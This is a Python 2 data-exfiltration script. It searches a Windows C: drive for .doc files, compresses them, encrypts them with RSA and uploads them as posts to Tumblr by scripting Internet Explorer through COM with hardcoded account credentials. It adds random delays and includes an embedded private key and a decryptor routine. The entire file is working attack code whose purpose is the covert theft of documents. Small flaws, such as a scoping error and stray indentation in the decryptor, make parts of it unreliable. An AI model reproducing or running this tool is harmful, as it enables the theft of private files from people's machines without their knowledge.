import os
import time
import zlib
import base64
import random
import fnmatch
import win32com.client
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP


doc_type   = ".doc"
username   = "test@test.com"
password   = "testpassword"
public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyXUTgFoL/2EPKoN31l5T
lak7VxhdusNCWQKDfcN5Jj45GQ1oZZjsECQ8jK5AaQuCWdmEQkgCEV23L2y71G+T
h/zlVPjp0hgC6nOKOuwmlQ1jGvfVvaNZ0YXrs+sX/wg5FT/bTS4yzXeW6920tdls
2N7Pu5N1FLRW5PMhk6GW5rzVhwdDvnfaUoSVj7oKaIMLbN/TENvnwhZZKlTZeK79
ix4qXwYLe66CrgCHDf4oBJ/nO1oYwelxuIXVPhIZnVpkbz3IL6BfEZ3ZDKzGeRs6
YLZuR2u5KUbr9uabEzgtrLyOeoK8UscKmzOvtwxZDcgNijqMJKuqpNZczPHmf9cS
1wIDAQAB
-----END PUBLIC KEY-----"""
private_key = """-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAyXUTgFoL/2EPKoN31l5Tlak7VxhdusNCWQKDfcN5Jj45GQ1o
ZZjsECQ8jK5AaQuCWdmEQkgCEV23L2y71G+Th/zlVPjp0hgC6nOKOuwmlQ1jGvfV
vaNZ0YXrs+sX/wg5FT/bTS4yzXeW6920tdls2N7Pu5N1FLRW5PMhk6GW5rzVhwdD
vnfaUoSVj7oKaIMLbN/TENvnwhZZKlTZeK79ix4qXwYLe66CrgCHDf4oBJ/nO1oY
welxuIXVPhIZnVpkbz3IL6BfEZ3ZDKzGeRs6YLZuR2u5KUbr9uabEzgtrLyOeoK8
UscKmzOvtwxZDcgNijqMJKuqpNZczPHmf9cS1wIDAQABAoIBAAdOiMOKAI9lrNAk
7o7G4w81kSJqjtO8S0bBMZW5Jka90QJYmyW8MyuutMeBdnKY6URrAEILLJAGryM4
NWPSHC69fG/li02Ec26ffC8A67FSR/rtbEIxj4tq6Q6gg0FLwg5EP6b/+vW61a1+
YBSMa0c+ZZhvE7sJg3FQZDJflQKPXFHYxOlS42+UyUP8K07cFznsQCvia9mCHUG6
BDFbV/yjbMyYgKTCVmMeaCS2K0TlbcyGpF0Bz95mVpkrU6pHXY0UAJIv4dyguywe
dBZcJlruSRL0OJ+3Gb3CJS7YdsPW807LSyf8gcrHMpgV5z2CdGlaoaLBJyS/nDHi
n07PIbECgYEA4Rjlet1xL/Sr9HnHVUH0m1iST0SrLlQCzrMkiw4g5rCOCnhWPNQE
dpnRpgUWMhhyZj82SwigkdXC2GpvBP6GDg9pB3Njs8qkwEsGI8GFhUQfKf8Bnnd2
w3GUHiRoJpVxrrE3byh23pUiHBdbp7h2+EaOTrRsc2w3Q4NbNF+FOOkCgYEA5R1Z
KvuKn1Sq+0EWpb8fZB+PTwK60qObRENbLdnbmGrVwjNxiBWE4BausHMr0Bz/cQzk
tDyohkHx8clp6Qt+hRFd5CXXNidaelkCDLZ7dasddXm1bmIlTIHjWWSsUEsgUTh7
crjVvghU2Sqs/vCLJCW6WYGb9JD2BI5R9pOClb8CgYEAlsOtGBDvebY/4fwaxYDq
i43UWSFeIiaExtr30+c/pCOGz35wDEfZQXKfF7p6dk0nelJGVBVQLr1kxrzq5QZw
1UP/Dc18bvSASoc1codwnaTV1rQE6pWLRzZwhYvO8mDQBriNr3cDvutWMEh4zCpi
DMJ9GDwCE4DctuxpDvgXa9kCgYEAuxNjo30Qi1iO4+kZnOyZrR833MPV1/hO50Y4
RRAGBkX1lER9ByjK/k6HBPyFYcDLsntcou6EjFt8OnjDSc5g2DZ9+7QKLeWkMxJK
Yib+V+4Id8uRIThyTC4ifPN+33D4SllcMyhJHome/lOiPegbNMC5kCwMM33J455x
vmxjy/ECgYAOrFR7A9fP4QlPqFCQKDio/FhoQy5ERpl94lGozk4Ma+QDJiRUxA3N
GomBPAvYGntvGgPWrsEHrS01ZoOKGBfk5MgubSPFVI00BD6lccmff/0tOxYtb+Pp
vOGHt9D9yo3DOhyvJbedpi3u3g13G+FZFw6d1T8Jzm5eZUvG7WeUtg==
-----END RSA PRIVATE KEY-----"""

encrypted = """XxfaX7nfQ48K+l0rXM3tQf3ShFcytAQ4sLe6vn8bWdreho4riaJ5Dy5PeijSKbsgWSMoeZLmihxb0YAFgCaIp11AUl4kmIiY+c+8LJonbTTembxv98GePM1SEme5/vMwGORJilw+rTdORSHzwbC56sw5NG8KosgLWwHEGEGbhii2qBkuyQrIc9ydoOKKCe0ofTRnaI2c/lb9Ot3vkEIgxCks94H6qVkAfhO34HS7nClUldn9UN040RYgtEqBgvAFzoEhDuRtfjJu1dzyzaFtRAVhcQ6HdgZMWRfpaxKQOmbhXwYyGRQfwNl/Rwgn1EJBFAhvIaEifHDlCw+hLViNYlae7IdfIb6hWtWPyFrkaNjmkbhhXclNgZe0+iPPDzsZbpHI1IckG0gVlTdlGKGz+nK5Cxyso41icC4gO7tmdXDGgF6bMt/GC1VjMVmL/rYsb8jzJblmuQBAeFNacyhjxrzIH5v60RQ1BxwfD+wLCKfyzn3vQucPak2cnwBs3yTIEShYj0ymP4idU/5Qt5qkqMDyvO4U8DmqB4KT58+o2B3c88+lUZjz7c9ygwKjp2hSNf+Dm9H3YJY2Pn6YlydyT1sYWCy06DZko7z3uae5GYGjez8hnCIFt+mpeLvEelSHeZfyV8wYyHg5Y9eA2NZNX6yNVD8IREhjXGWdbGTn41lVCqEiCetY9SKdWeL1Hp/vJN3SOo4qglbQF7P6oqqg0bofnAcphLVaHw/FOGWtW1CFEQUQdIg9bk+SJqM/s1ozJlisenrRzxv3L5LthEfLflCafK0u3n2gPa4F3ok4tx9i+r+MykRTw+OksMfVu71CAMuJdrFQLMSpyWkQ86Vc/QIXgdoCKkAYx5xr/U8gDXkZ4GvL9biEZv/fb5Wh7Br1Hu6idUgTYpEJVVnMuI13ePGeJLA54Il2S7aDyrgfhb61WQmoMRGvLP7uxCjgLwrxZNjAYJTmXszLvvgmI+lHe5o8rgQw6zSGpl9k27urV4bA0Zt+PsYiLNbEQqqxrJxKcbKqozl8XtfMXanct9pKu4vaq8fH/j9jvZ133UtcaR5iTQ0K7P4J5Qoaxz3uUhGrgplZ1jE9Nr0iyRj722dW82b4m1f/h80K7EuvwEeOfdYZl7iFL8yRi9dfopwATjKbKrWFroGCb/wvpc5ujpzDfwAeWsSU4Nve2qBDo5coVt1GI8rzHUh52TQ007JhcYABIxZGSFeeJ3bFgvqO2kUK/Pc36Au0VlNFds/j+fIuMlmFUuckBLCTpE2W9hYqmVOWBmyeZPJNzVI4gLexFbXbg8+0Eq6Pa4MxZsR3wypgC9LE/dvLbQ3oSn9x7nKMXpdq9r+xK1sjodpeYNz7t/5GpFu1teN0SFbmsoXjVEyOAn3L5Gd4Wxua7y9xOixc1H2/bbyNqJZAjEm34DDmNRTQtrqCwOEXwFGKgRGUzPYGC74wAPDDTaQEBv7Toc7rfkzgRX4ROW0SUaEPmi5tAlXe+CKVdJGtLKXUXYRHLMZ4jTzGsD89dmt2r2Fh6AUUN2e9jzzK2ULMnMhRUnDdcM74jbuDHGtXt56pFxFKJ21FQFS8JK0ZOqYa+0JjLuSzrLN9gSCu/JuTPC60LTxLsLcWZVR7cIHQE+sgDtt40/6O1YE7/8rs6qB9re28gDY1s9R5HFtjowO3ylRWqlaV9MC1OGzM4xHPxG2V+2zuq6ol8Cs="""


def keygen():
    new_key = RSA.generate(2048, e=65537) 
    public_key = new_key.publickey().exportKey("PEM") 
    private_key = new_key.exportKey("PEM") 
    print public_key
    print private_key


def decryptor():
    offset    = 0
    decrypted = ""

    rsakey = RSA.importKey(private_key) 
    rsakey = PKCS1_OAEP.new(rsakey) 
    encrypted = base64.b64decode(encrypted)
    while offset < len(encrypted):
        decrypted += rsakey.decrypt(encrypted[offset:offset+256])
        offset += 256
    plaintext = zlib.decompress(decrypted)
	return plaintext


def wait_for_browser(browser):
    while browser.ReadyState != 4 and browser.ReadyState != "complete":    
        time.sleep(0.1)
    return


def encrypt_string(plaintext):
    chunk_size = 256

    print "Compressing: %d bytes" % len(plaintext)
    plaintext = zlib.compress(plaintext)
    print "Encrypting %d bytes" % len(plaintext)
    rsakey = RSA.importKey(public_key)
    rsakey = PKCS1_OAEP.new(rsakey)
    encrypted = ""
    offset    = 0

    while offset < len(plaintext):
        chunk = plaintext[offset:offset+256]
        if len(chunk) % chunk_size != 0:
            chunk += " " * (chunk_size - len(chunk))
        encrypted += rsakey.encrypt(chunk)
        offset    += chunk_size
    encrypted = encrypted.encode("base64")
    print "Base64 encoded crypto: %d" % len(encrypted)

    return encrypted


def encrypt_post(filename):
    fd = open(filename,"rb")
    contents = fd.read()
    fd.close()
    encrypted_title = encrypt_string(filename)
    encrypted_body  = encrypt_string(contents)
    return encrypted_title,encrypted_body


def random_sleep():
    time.sleep(random.randint(5,10))
    return


def login_to_tumblr(ie):
    full_doc = ie.Document.all
    for i in full_doc:
        if i.id == "signup_email":
            i.setAttribute("value",username)
        elif i.id == "signup_password":
            i.setAttribute("value",password)
    random_sleep()

    try:
        if ie.Document.forms[0].id == "signup_form":
            ie.Document.forms[0].submit()
        else:
            ie.Document.forms[1].submit()
    except IndexError, e:
        pass

    random_sleep()
    wait_for_browser(ie)

    return


def post_to_tumblr(ie,title,post):
    full_doc = ie.Document.all
    for i in full_doc:
        if i.id == "post_one":
            i.setAttribute("value",title)
            title_box = i
            i.focus()
        elif i.id == "post_two":
            i.setAttribute("innerHTML",post)
            print "Set text area"
            i.focus()
        elif i.id == "create_post":
            print "Found post button"
            post_form = i
            i.focus()

    # move focus away from the main content box        
    random_sleep()    
    title_box.focus()
    random_sleep()
    post_form.children[0].click()
    wait_for_browser(ie)
    random_sleep()

    return


def exfiltrate(document_path):
    ie = win32com.client.Dispatch("InternetExplorer.Application")
    ie.Visible = 1

    # head to tumblr and login
    ie.Navigate("http://www.tumblr.com/login")
    wait_for_browser(ie)
    print "Logging in..."
    login_to_tumblr(ie)
    print "Logged in...navigating"

    ie.Navigate("https://www.tumblr.com/new/text")
    wait_for_browser(ie)
    title,body = encrypt_post(document_path)
    print "Creating new post..."
    post_to_tumblr(ie,title,body)
    print "Posted!"

    # Destroy the IE instance
    ie.Quit()
    ie = None
    return


if __name__ == '__main__':
    for parent, directories, filenames in os.walk("C:\\"):
        for filename in fnmatch.filter(filenames,"*%s" % doc_type):
            document_path = os.path.join(parent,filename)
            print "Found: %s" % document_path
            exfiltrate(document_path)
            raw_input("Continue?")
